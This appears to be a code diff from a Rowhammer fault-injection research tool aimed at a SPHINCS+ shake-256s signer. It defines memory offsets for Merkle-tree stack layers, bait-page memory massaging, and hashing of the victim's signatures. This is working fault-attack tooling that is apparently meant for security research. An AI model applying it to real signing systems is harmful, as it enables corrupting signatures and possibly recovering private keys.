@@ -93,6 +93,7 @@ const KEYS_FILE: &str = "keys.txt";
 // find profile entry with bitflips in needed range
 #[derive(Clone, Debug, Serialize)]
 pub struct TargetOffset {
+    id: usize,
     description: &'static str,
     pub page_offset: usize,
     stack_offset: usize,
@@ -126,43 +127,112 @@ fn filter_addrs(flips: Vec<BitFlip>, targets: &[TargetOffset]) -> Vec<(usize, Ta
 }
 
 const _TARGET_OFFSETS_ANY: [TargetOffset; 1] = [TargetOffset {
+    id: 0,
     description: "any",
     page_offset: 0,
-    stack_offset: 31,
+    stack_offset: 30,
     target_size: 0x1000,
     flip_direction: FlipDirection::Any,
 }];
 
+const SPX_N: usize = 32;
+
+const STACK_BASE: usize = 0x630;
+const STACK_OFFSET: usize = 32;
+
 // Target offsets for shake-256s WITH memutils printing enabled
-pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 1] = [
+pub const TARGET_OFFSETS_SHAKE_256S: [TargetOffset; 10] = [
+    // stack for h in 0..8
     TargetOffset {
-        description: "stack merkle tree layer 0",
-        page_offset: 0x630,
-        stack_offset: 32,
-        target_size: 32, // SPX_N
+        id: 0,
+        description: "stack merkle layer 0 256s",
+        page_offset: STACK_BASE,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
         flip_direction: FlipDirection::OneToZero,
     },
-    /*TargetOffset {
-        description: "leaf_addr",
-        page_offset: 0xc88,
-        stack_offset: 31,
-        target_size: 22,
+    TargetOffset {
+        id: 1,
+        description: "stack merkle layer 1 256s",
+        page_offset: STACK_BASE + SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::ZeroToOne,
     },
     TargetOffset {
-        description: "pk_addr",
-        page_offset: 0xca8,
-        stack_offset: 31,
+        id: 2,
+        description: "stack merkle layer 2 256s",
+        page_offset: STACK_BASE + 2 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::OneToZero,
+    },
+    TargetOffset {
+        id: 3,
+        description: "stack merkle layer 3 256s",
+        page_offset: STACK_BASE + 3 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::ZeroToOne,
+    },
+    TargetOffset {
+        id: 4,
+        description: "stack merkle layer 4 256s",
+        page_offset: STACK_BASE + 4 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::OneToZero,
+    },
+    TargetOffset {
+        id: 5,
+        description: "stack merkle layer 5 256s",
+        page_offset: STACK_BASE + 5 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::OneToZero,
+    },
+    TargetOffset {
+        id: 6,
+        description: "stack merkle layer 6 256s",
+        page_offset: STACK_BASE + 6 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::ZeroToOne,
+    },
+    TargetOffset {
+        id: 7,
+        description: "stack merkle layer 7 256s",
+        page_offset: STACK_BASE + 7 * SPX_N,
+        stack_offset: STACK_OFFSET,
+        target_size: SPX_N,
+        flip_direction: FlipDirection::OneToZero,
+    },
+    TargetOffset {
+        id: 8,
+        description: "merkle leaf_addr",
+        page_offset: 0x868,
+        stack_offset: 32,
         target_size: 22,
-    },*/
+        flip_direction: FlipDirection::ZeroToOne,
+    },
+    TargetOffset {
+        id: 9,
+        description: "merkle pk_addr",
+        page_offset: 0x888,
+        stack_offset: 32,
+        target_size: 22,
+        flip_direction: FlipDirection::ZeroToOne,
+    },
 ];
 
 fn find_injectable_page(flips: Vec<BitFlip>) -> Option<InjectionConfig> {
     // the number of bait pages to release after the target page (for memory massaging)
-    let bait_count_after = HashMap::from([(32, 1)]);
+    let bait_count_after = HashMap::from([(32, 1), (30, 22)]);
 
-    filter_addrs(flips, &TARGET_OFFSETS_SHAKE_256S)
+    filter_addrs(flips, &_TARGET_OFFSETS_ANY)
         .first()
         .map(|f| InjectionConfig {
+            id: f.1.id,
             target_addr: f.0,
             flippy_page_size: PAGE_SIZE,
             bait_count_after: bait_count_after
@@ -216,6 +286,7 @@ impl HammerVictim for SphincsPlus {
                 set_process_affinity(unsafe { libc::getpid() }, get_current_core());
                 let mut cmd = std::process::Command::new(binary);
                 cmd.arg(KEYS_FILE);
+                cmd.arg(injection_config.id.to_string());
                 cmd.stdin(std::process::Stdio::piped());
                 cmd.stdout(std::process::Stdio::piped());
                 cmd.stderr(std::process::Stdio::piped());
@@ -271,7 +342,6 @@ impl HammerVictim for SphincsPlus {
                 // find flippy page
                 thread::sleep(Duration::from_millis(100)); // wait before checking for flippy page, as victim might need some time to allocate the stack
                 if let Err(e) = self.check_flippy_page_exists() {
-                    error!("Failed to find flippy page: {:?}", e);
                     Err(e)
                 } else {
                     Ok(())
@@ -322,8 +392,8 @@ impl HammerVictim for SphincsPlus {
                 };
                 let expected_sha256 = [
                     "a2dc0903dbbf54dfaeec7475438864b8fa0b22f6fe9d0aa3d91faf5b323abde5", // sphincs+ sig
-                    "f3336bea752b5a28743033dd2c844a4a63fba08871aaee2586a2bf2d69be83a2", // dummy "aaaaaa..."
-                    "5af53f7370947ba6975447488f7da0420887fdce811d5ce5e1bfe5125d24c977", // dummy "555555..."
+                    "dd4e6730520932767ec0a9e33fe19c4ce24399d6eba4ff62f13013c9ed30ef87", // dummy 4096 bytes of 0xaa (python3 -c "print('aa' * 4096, end='')" | shasum -a 256)
+                    "12d0401ec5e681b3da36c7654381c418e671fb288fe320893f0efeb021df2582", // dummy 4096 bytes of 0x55 (python3 -c "print('55' * 2048, end='')" | shasum -a 256)
                 ];
                 let mut hasher = Sha256::new();
                 hasher.update(signature.as_bytes());
@@ -432,6 +502,7 @@ mod tests {
     fn test_filter_addrs_match_start() {
         let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let targets = [TargetOffset {
+            id: usize::MAX,
             description: "test_filter_flips_match_start",
             page_offset: 0x700,
             stack_offset: 31,
@@ -446,6 +517,7 @@ mod tests {
     fn test_filter_addrs_match_end() {
         let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let target = TargetOffset {
+            id: usize::MAX,
             description: "test_filter_flips_match_end",
             page_offset: 0x600,
             stack_offset: 31,
@@ -460,6 +532,7 @@ mod tests {
     fn test_filter_addrs_nomatch() {
         let flip = BitFlip::new(0x700 as *const u8, 0x1, 0x1);
         let target = TargetOffset {
+            id: usize::MAX,
             description: "test_filter_flips_nomatch",
             page_offset: 0x600,
             stack_offset: 31,
